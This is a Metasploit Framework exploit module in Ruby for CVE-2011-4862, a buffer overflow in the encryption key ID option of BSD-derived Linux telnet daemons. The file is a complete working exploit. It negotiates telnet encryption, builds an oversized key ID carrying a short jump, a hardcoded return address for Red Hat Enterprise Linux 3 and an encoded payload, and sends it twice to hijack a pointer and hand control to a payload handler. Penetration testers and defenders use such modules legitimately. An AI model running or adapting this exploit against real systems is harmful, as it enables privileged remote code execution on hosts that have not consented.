##
# $Id: $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking
	
	include Msf::Exploit::Remote::Telnet
	include Msf::Exploit::BruteTargets

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Linux BSD-derived Telnet Service Encryption Key ID Buffer Overflow',
			'Description'    => %q{	
					This module exploits a buffer overflow in the encryption option handler of the
				Linux BSD-derived telnet service (inetutils or krb5-telnet). Most Linux distributions
				use NetKit-derived telnet daemons, so this flaw only applies to a small subset of
				Linux systems running telnetd.
				},
			'Author'         => [ 'Jaime Penalba Estebanez <jpenalbae[at]gmail.com>', 'Brandon Perry <bperry.volatile[at]gmail.com>', 'Dan Rosenberg', 'hdm' ],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					['CVE', '2011-4862'],
					['OSVDB', '78020'],
					['BID', '51182'],
					['URL', 'http://www.exploit-db.com/exploits/18280/']
				],
			'Privileged'     => true,
			'Platform'       => 'linux',
			'Payload'        =>
				{
					'Space'       => 200,
					'BadChars'    => "\x00",
					'DisableNops' => true,
				},
 
			'Targets'        =>
				[
					[ 'Automatic',  { } ],
					[ 'Red Hat Enterprise Linux 3 (krb5-telnet)', { 'Ret' => 0x0804b43c } ],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Dec 23 2011'))
	end

	def exploit_target(t)

		connect
		banner_sanitized = Rex::Text.to_hex_ascii(banner.to_s)
		print_status(banner_sanitized) if datastore['VERBOSE']

		enc_init      = "\xff\xfa\x26\x00\x01\x01\x12\x13\x14\x15\x16\x17\x18\x19\xff\xf0"
		enc_keyid     = "\xff\xfa\x26\x07"
		end_suboption = "\xff\xf0"

		penc = payload.encoded.gsub("\xff", "\xff\xff")
		
		key_id = Rex::Text.rand_text_alphanumeric(400)

		key_id[ 0, 2] = "\xeb\x76"
		key_id[72, 4] = [ t['Ret'] - 20 ].pack("V")
		key_id[76, 4] = [ t['Ret'] ].pack("V")

		# Some of these bytes can get mangled, jump over them
		key_id[80,40]  = "\x41" * 40

		# Insert the real payload
		key_id[120, penc.length] = penc

		# Create the Key ID command
		sploit = enc_keyid + key_id + end_suboption

		# Initiate encryption
		sock.put(enc_init)

		# Wait for a successful response
		loop do
			data = sock.get_once(-1, 5) rescue nil
			if not data
				raise RuntimeError, "This system does not support encryption"
			end
			break if data.index("\xff\xfa\x26\x02\x01")
		end

		# The first request smashes the pointer
		print_status("Sending first payload")
		sock.put(sploit) 
		
		# Make sure the server replied to the first request
		data = sock.get_once(-1, 5)
		unless data
			print_status("Server did not respond to first payload")
			return
		end

		# Some delay between each request seems necessary in some cases
		::IO.select(nil, nil, nil, 0.5)

		# The second request results in the pointer being called
		print_status("Sending second payload...")
		sock.put(sploit)
		handler

		::IO.select(nil, nil, nil, 0.5)
		disconnect
	end

end
